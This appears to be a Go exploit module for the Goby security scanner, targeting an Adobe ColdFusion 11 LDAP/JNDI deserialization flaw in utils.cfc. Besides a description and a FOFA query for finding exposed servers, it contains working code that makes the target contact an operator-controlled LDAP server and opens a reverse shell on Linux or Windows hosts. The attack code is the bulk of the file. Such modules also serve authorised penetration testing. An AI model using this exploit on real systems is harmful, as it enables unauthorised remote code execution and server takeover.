package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Adobe ColdFusion 11 LDAP utils.cfc file Object Deserialization Vulnerability",
    "Description": "<p>Adobe ColdFusion is a set of rapid application development platform of Adobe (Adobe) in the United States.</p><p>ColdFusion allows unauthenticated users to connect to any LDAP server, which can be exploited by attackers to achieve remote code execution, JNDI attacks via the verifyldapserver parameter on utils.cfc.</p>",
    "Impact": "<p>Adobe ColdFusion 11 LDAP Java Object Deserialization</p>",
    "Recommendation": "<p>1、Use WAF protection.</p><p>2、Pay attention to the timely update of official patches: https://www.adobe.com/support/coldfusion/downloads_updates.html</p>",
    "Product": "Adobe ColdFusion",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Adobe ColdFusion 11 LDAP utils.cfc 文件反序列化漏洞",
            "Product": "Adobe ColdFusion",
            "Description": "<p>Adobe ColdFusion是美国奥多比（Adobe）公司的一套快速应用程序开发平台。</p><p>ColdFusion 允许未经身份验证的用户连接到任何 LDAP 服务器，攻击者可以利用它来实现远程代码执行，通过 utils.cfc 上的verifyldapserver参数进行 JNDI 攻击。<br></p>",
            "Recommendation": "<p>1、使用WAF进行防护</p><p>2、关注官方补丁及时更新：<a href=\"https://www.adobe.com/support/coldfusion/downloads_updates.html\">https://www.adobe.com/support/coldfusion/downloads_updates.html</a></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。\t<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Adobe ColdFusion 11 LDAP utils.cfc file Object Deserialization Vulnerability",
            "Product": "Adobe ColdFusion",
            "Description": "<p>Adobe ColdFusion is a set of rapid application development platform of Adobe (Adobe) in the United States.</p><p>ColdFusion allows unauthenticated users to connect to any LDAP server, which can be exploited by attackers to achieve remote code execution, JNDI attacks via the verifyldapserver parameter on utils.cfc.</p>",
            "Recommendation": "<p>1、Use WAF protection.</p><p>2、Pay attention to the timely update of official patches:&nbsp;<span style=\"color: rgb(22, 51, 102); font-size: 16px;\"><a href=\"https://www.adobe.com/support/coldfusion/downloads_updates.html\">https://www.adobe.com/support/coldfusion/downloads_updates.html</a></span></p>",
            "Impact": "<p>Adobe ColdFusion 11 LDAP Java Object Deserialization</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "header=\"CFID=\" || banner=\"CFID=\"",
    "GobyQuery": "header=\"CFID=\" || banner=\"CFID=\"",
    "Author": "sharecast.net@gmail.com",
    "Homepage": "https://www.adobe.com/sea/products/coldfusion-family.html",
    "DisclosureDate": "2022-02-22",
    "References": [
        "https://www.exploit-db.com/exploits/50781"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "createSelect",
            "value": "goby_shell_linux,goby_shell_win",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10363"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			ldapPort := 80
			uri := fmt.Sprintf("/CFIDE/wizards/common/utils.cfc?method=verifyldapserver&vserver=%s&vport=%d&vstart=&vusername=&vpassword=&returnformat=json", checkUrl, ldapPort)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 200 {
				return godclient.PullExists(checkStr, time.Second*15)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["AttackType"].(string) == "goby_shell_linux" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					ldapServerAddr := godclient.GetGodServerHost()
					uriPath := "E" + godclient.GetKey() + rp
					log.Println(ldapServerAddr)
					uri := fmt.Sprintf("/CFIDE/wizards/common/utils.cfc?method=verifyldapserver&vserver=%s&vport=%s&vstart=%s&vusername=&vpassword=&returnformat=json", ldapServerAddr, "389", uriPath)
					cfg := httpclient.NewGetRequestConfig(uri)
					cfg.VerifyTls = false
					cfg.FollowRedirect = false
					go httpclient.DoHttpRequest(expResult.HostInfo, cfg)
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						} else {
							expResult.Success = false
							expResult.Output = "Automatic exploitation failed, please try manual exploitation, reference tool: https://github.com/veracode-research/rogue-jndi"
						}
					case <-time.After(time.Second * 15):
					}
					expResult.Success = false
					expResult.Output = "Automatic exploitation failed, please try manual exploitation, reference tool: https://github.com/veracode-research/rogue-jndi"
				}
			}
			if ss.Params["AttackType"].(string) == "goby_shell_win" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					ldapServerAddr := godclient.GetGodServerHost()
					uriPath := "E" + godclient.GetKey() + rp
					log.Println(ldapServerAddr)
					uri := fmt.Sprintf("/CFIDE/wizards/common/utils.cfc?method=verifyldapserver&vserver=%s&vport=%s&vstart=%s&vusername=&vpassword=&returnformat=json", ldapServerAddr, "389", uriPath)
					cfg := httpclient.NewGetRequestConfig(uri)
					cfg.VerifyTls = false
					cfg.FollowRedirect = false
					go httpclient.DoHttpRequest(expResult.HostInfo, cfg)
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 15):
					}
					expResult.Success = false
					expResult.Output = "Automatic exploitation failed, please try manual exploitation, reference tool: https://github.com/veracode-research/rogue-jndi"
				}
			}
			return expResult
		},
	))
}
